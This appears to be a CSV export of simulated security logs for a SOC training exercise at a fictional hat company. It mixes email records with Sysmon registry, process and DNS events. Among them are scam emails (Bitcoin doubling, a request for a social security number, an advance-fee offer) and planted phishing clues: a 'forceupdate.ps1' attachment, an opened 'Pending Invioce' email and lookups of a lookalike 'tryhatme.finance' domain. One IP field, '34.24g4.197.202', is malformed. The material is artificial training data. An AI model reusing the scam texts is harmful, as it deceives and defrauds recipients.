"qHVwypsB8mE-0EyZLH4b","-",logs,"-",None," Got it. Will prepare the slides.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","invoice@tryhatme.com","RE: New Hat Designs - Team Meeting Tomorrow","Jan 17, 2026 @ 02:31:01.304","-"
"p3VwypsB8mE-0EyZKH5-","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3823,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:30:57.304","-"
"pnVvypsB8mE-0EyZ1n4k","-",logs,"-",None," Love these! The blue one is my favorite.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","yani.zubair@tryhatme.com","-","-","-","yani.zubair@tryhatme.com","RE: Hat-tastic News: New Designs Unveiled!","Jan 17, 2026 @ 02:30:56.304","-"
"onVvypsB8mE-0EyZcH6-","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","gardner@chicchapeauqueen.com","-","-","-","invoice@tryhatme.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:30:36.304","-"
"o3VvypsB8mE-0EyZdH56","-",logs,"-",None," Will there be a recording available for those unable to attend live",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","tobias@crowninggloryhats.org","-","-","-","armaan.terry@tryhatme.com","RE: RE: Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:30:35.304","-"
"pHVvypsB8mE-0EyZj37d","-",logs,"-",None," Gorgeous hat wearing models from the Moon are searching for their Earth soulmate Could it be you Click to chat now",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","roger.fedora@tryhatme.com","-","-","-","levine@headwearmarketwatch.org","Lunarian Hat Models Want to Meet You Click for Love","Jan 17, 2026 @ 02:30:29.304","-"
"n3VvypsB8mE-0EyZC346","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3452","-","-","-","-","-","-","-","-","-",3727,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:30:21.304","-"
"oXVvypsB8mE-0EyZOX7v","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3456","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3674,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:30:04.304","-"
"oHVvypsB8mE-0EyZDn72","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3461","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3948,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:29:54.304","-"
"nnVuypsB8mE-0EyZb35h","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3451","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3771,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:29:08.304","-"
"m3VtypsB8mE-0EyZkH4-","-",logs,"-",None," Love these! The blue one is my favorite.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","kyra.flores@tryhatme.com","-","-","-","kyra.flores@tryhatme.com","RE: Hat-tastic News: New Designs Unveiled!","Jan 17, 2026 @ 02:28:51.304","-"
"nXVtypsB8mE-0EyZ8X7y","-",logs,"-",None," Want a bigger more impressive hat collection Our revolutionary hat growth formula guarantees results in just days Try now before the FDA finds out",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michael.ascot@tryhatme.com","-","-","-","keane@modernmillinerygroup.online","Amazing Hat Enhancement Pills Grow Your Hat Collection Instantly","Jan 17, 2026 @ 02:28:35.304","-"
"nHVtypsB8mE-0EyZ2n54","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","""LogonUI.exe"" /flags:0x0 /state0:0xb572b855 /state1:0x41c64e6d","LogonUI.exe","winlogon.exe",3518,3918,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:28:34.304","-"
"mnVtypsB8mE-0EyZcX4R","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3458","-","-","-","-","-","C:\Windows\System32\mousocoreworker.exe -Embedding","MoUsoCoreWorker.exe","-",3680,3965,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:28:12.304","-"
"lXVsypsB8mE-0EyZ937M","-",logs,"-","forceupdate.ps1","Thanks Yani! I'll run this script right away. The update issues have been really frustrating lately.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","yani.zubair@tryhatme.com","-","-","-","michelle.smith@tryhatme.com","RE: Force update fix","Jan 17, 2026 @ 02:27:56.304","-"
"mHVtypsB8mE-0EyZG34D","-",logs,"-","-","-",sysmon,"-","-","-","-","CreateRemoteThread detected (rule: CreateRemoteThread)",8,"-","win-3460","-","-","-","-","-","-","dwm.exe","-","-",3772,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:48.304","-"
"kHVsypsB8mE-0EyZyX4M","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3844,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:27:45.304","-"
"k3VsypsB8mE-0EyZ2H63","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:45.304","-"
"lHVsypsB8mE-0EyZ6H4l","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml:Zone.Identifier","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:45.304","-"
"lnVsypsB8mE-0EyZ937n","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:45.304","-"
"l3VtypsB8mE-0EyZE349","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE"" /eml ""C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml""","OUTLOOK.EXE","OUTLOOK.EXE",8668,5176,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:45.304","-"
"mXVtypsB8mE-0EyZOn5S","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml:OECustomProperty","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:45.304","-"
"jnVsypsB8mE-0EyZfn7N","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml:Zone.Identifier","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:42.304","-"
"j3VsypsB8mE-0EyZoX76","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:42.304","-"
"kXVsypsB8mE-0EyZ0H7Z","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:42.304","-"
"knVsypsB8mE-0EyZ1H6m","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\Important: Pending Invioce!.eml:OECustomProperty","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:42.304","-"
"i3VsypsB8mE-0EyZSH4l","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3451","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3724,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:27:28.304","-"
"inVsypsB8mE-0EyZMH65","-",logs,"-",None," Just following up to see if the designs meet your expectations and if you need any modifications before finalizing the order",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","edna@headwearreporter.net","RE: RE: Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:27:10.304","-"
"iHVrypsB8mE-0EyZ-n4H","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3454","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3620,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:26:56.304","-"
"jHVsypsB8mE-0EyZT37V","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3455","-","-","-","-","-","-","spoolsv.exe","-","-",3913,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:26:54.304","-"
"jXVsypsB8mE-0EyZU36-","-",logs,"-",None," Hurry These suspiciously cheap hotel vouchers are selling fast Book now before they totally stop working upon arrival",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","josephine@yahoo.com","-","-","-","support@tryhatme.com","Scam Alert Fake Hat Hotel Vouchers Up for Grabs","Jan 17, 2026 @ 02:26:54.304","-"
"hnVrypsB8mE-0EyZkH5z","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3451","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3726,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:26:40.304","-"
"g3VrypsB8mE-0EyZYX6w","-",logs,"-",None," Our exclusive system guarantees instant Bitcoin doubling Send us just 100 and watch it turn into 200 instantly",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","diego.summers@tryhatme.com","-","-","-","tim@headweartrendsetters.org","Instant Wealth Send Bitcoin to Double Your Money","Jan 17, 2026 @ 02:26:29.304","-"
"iXVrypsB8mE-0EyZ_X7N","-",logs,"-",None," I have added some discussion points to the agenda We should also touch on competitive analysis",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michael.ascot@tryhatme.com","-","-","-","silas@customcrownhats.org","RE: RE: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:26:27.304","-"
"hHVrypsB8mE-0EyZiH64","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3451","-","-","-","-","-","-","spoolsv.exe","-","-",3751,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:26:23.304","-"
"gnVrypsB8mE-0EyZYX6n","-",logs,"-",None," Just confirming my attendance Will there be a list of attendees shared beforehand",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","juliet@panachepanamas.com","RE: RE: Invitation to a Business Networking Luncheon Next Week","Jan 17, 2026 @ 02:26:21.304","-"
"h3VrypsB8mE-0EyZv35q","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3989,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:26:19.304","-"
"hXVrypsB8mE-0EyZjH59","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3451","-","-","-","-","-","-","spoolsv.exe","-","-",3955,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:26:15.304","-"
"gHVrypsB8mE-0EyZH35E","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3859,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:26:02.304","-"
"gXVrypsB8mE-0EyZJ34K","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3450","-","-","-","-","-","-","spoolsv.exe","-","-",3846,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:25:50.304","-"
"f3VqypsB8mE-0EyZvX6U","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3461","-","-","-","-","-","""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"" ","OUTLOOK.EXE","explorer.exe",3772,3769,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:25:42.304","-"
"fnVqypsB8mE-0EyZkn6m","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3455","-","-","-","-","-","""C:\Windows\System32\WUDFHost.exe"" -HostGUID:{24b7eef1-ada5-453b-a5a6-93007dca6fbc} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-fd5c32fb-5bb6-4693-82a7-6cec85d58bc4 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-3ba97dd6-3700-4e8a-8921-1e24128d9c7d -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-2a6ae716-7c20-4d0c-97b6-bb3346775edf -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-54470b14-46b9-4c56-abe1-d9b12ef13c5f -LifetimeId:39d16a20-5092-495b-95b9-c7e0ec216f0f -DeviceGroupId: -HostArg:0","WUDFHost.exe","services.exe",3817,3710,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:25:39.304","-"
"fXVqypsB8mE-0EyZin7T","-",logs,"-",None," Forwarding this information to our design team for review and feedback",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","arthur@hatfashionfair2022.com","-","-","-","support@tryhatme.com","FWD: Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:25:38.304","-"
"fHVqypsB8mE-0EyZRH5w","-",logs,"-",None," Reminder: Sign-ups close tomorrow.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","roger.fedora@tryhatme.com","-","-","-","roger.fedora@tryhatme.com","FWD: Employee Appreciation Day - Volunteer Sign-Up","Jan 17, 2026 @ 02:25:02.304","-"
"enVpypsB8mE-0EyZt37p","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3454","-","-","-","-","-","-","spoolsv.exe","-","-",3953,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:24:42.304","-"
"e3VqypsB8mE-0EyZQH6w","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3450","-","-","-","-","-","-","spoolsv.exe","-","-",3684,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:24:39.304","-"
"eHVpypsB8mE-0EyZXX7p","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3645,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:23:57.304","-"
"eXVpypsB8mE-0EyZbX6q","-",logs,"-","-","-",sysmon,"-","mail.tryhatme.finance, 34.24g4.197.202","autodiscover.tryhatme.finance","34.244.197.202","Dns query (rule: DnsQuery)",22,"-","win-3454","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3648,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:23:39.304","-"
"d3VpypsB8mE-0EyZWn4k","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3461","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:8580 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3565,3621,"C:\Users\sophie.j\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:23:39.304","-"
"dnVoypsB8mE-0EyZb36_","-",logs,"-",None," Sharing this event information for those interested in attending",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","le@hatnewsdaily.org","-","-","-","cain.omoore@tryhatme.com","FWD: Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:23:02.304","-"
"dXVoypsB8mE-0EyZNX4S","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3452","-","-","-","-","-","C:\Windows\system32\TSTheme.exe -Embedding","TSTheme.exe","-",3862,3689,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:22:47.304","-"
"cXVnypsB8mE-0EyZrH5c","-",logs,"-",None," Sharing this with our team so they can coordinate their visit and meeting schedules",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","omari@fashionforwardhatter.com","-","-","-","liam.espinoza@tryhatme.com","FWD: Upcoming Trade Show Attendance: Meet our Hat Experts","Jan 17, 2026 @ 02:22:26.304","-"
"dHVoypsB8mE-0EyZKX5b","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3453","-","-","-","-","-",rdpclip,"rdpclip.exe","svchost.exe",3925,3565,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:22:23.304","-"
"c3VoypsB8mE-0EyZIX6j","-",logs,"-",None," Don’t forget to RSVP! We need a final headcount.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","michelle.smith@tryhatme.com","Team Building Event - RSVP by Friday","Jan 17, 2026 @ 02:22:21.304","-"
"cnVnypsB8mE-0EyZrH5f","-",logs,"-",None," Just following up to see if the designs meet your expectations and if you need any modifications before finalizing the order",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","lee@panachepanamas.com","RE: RE: Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:22:08.304","-"
"b3VmypsB8mE-0EyZ-H7A","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3452","-","-","-","-","-","-","spoolsv.exe","-","-",3802,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:21:36.304","-"
"cHVnypsB8mE-0EyZbX70","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3455","-","-","-","-","-","""C:\Windows\System32\WUDFHost.exe"" -HostGUID:{eaa41944-3811-4056-972f-add85d3bfc01} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-fd5c32fb-5bb6-4693-82a7-6cec85d58bc4 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-3ba97dd6-3700-4e8a-8921-1e24128d9c7d -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-2a6ae716-7c20-4d0c-97b6-bb3346775edf -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-54470b14-46b9-4c56-abe1-d9b12ef13c5f -LifetimeId:39d16a20-5092-495b-95b9-c7e0ec216f0f -DeviceGroupId: -HostArg:0","WUDFHost.exe","services.exe",3648,3809,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:21:35.304","-"
"bXVmypsB8mE-0EyZon7k","-",logs,"-","-","-",sysmon,"-","mail.tryhatme.finance, 34.244.197.202","autodiscover.tryhatme.finance","34.244.197.202","Dns query (rule: DnsQuery)",22,"-","win-3449","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3587,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:21:22.304","-"
"bnVmypsB8mE-0EyZqn60","-",logs,"-",None," I am available on Thursday afternoon Let me know if that works for everyone else",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","duke@chicchapeauconclave.com","-","-","-","sophie.j@tryhatme.com","RE: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:21:15.304","-"
"bHVmypsB8mE-0EyZaH5K","-",logs,"-",None," There is free money waiting for you Just provide your social security number and mother's maiden name and watch the cash roll in",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","magnus@headwearmarketwatch.org","Free Money Alert Just Share Your Social Security Number","Jan 17, 2026 @ 02:21:08.304","-"
"a3VlypsB8mE-0EyZlX5N","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3451","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2832 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3779,3614,"C:\Users\miguel.odonnell\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:19:56.304","-"
"aHVlypsB8mE-0EyZL37F","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3451","-","-","-","-","-","taskhostw.exe KEYROAMING","taskhostw.exe","svchost.exe",3652,3945,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:19:43.304","-"
"anVlypsB8mE-0EyZS34p","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:8580 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3577,3707,"C:\Users\safa.prince\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:19:32.304","-"
"aXVlypsB8mE-0EyZL37F","-",logs,"-",None," We are happy to assist with your custom order Let us know your quantity preferred materials and design details so we can provide a tailored quote",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","gardner@headwearreporter.net","-","-","-","ceo@tryhatme.com","Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:19:13.304","-"
"ZnVkypsB8mE-0EyZ1X7E","-",logs,"-",None," A wealthy Lunarian prince needs your help to transfer 10 million space credits Invest in his intergalactic hat business and double your fortune",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","hannah@chicfashionbloggers.net","-","-","-","ceo@tryhatme.com","Lunarian Prince Offering Hat Investment Opportunities","Jan 17, 2026 @ 02:19:13.304","-"
"XnVkypsB8mE-0EyZrn7k","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3460","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2832 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3800,3645,"C:\Users\roger.fedora\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:18:59.304","-"
"Z3VkypsB8mE-0EyZ4X6E","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-",rdpclip,"rdpclip.exe","svchost.exe",3855,3587,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:18:53.304","-"
"XXVkypsB8mE-0EyZm35h","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3461","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:8580 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3877,3633,"C:\Users\sophie.j\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:18:46.304","-"
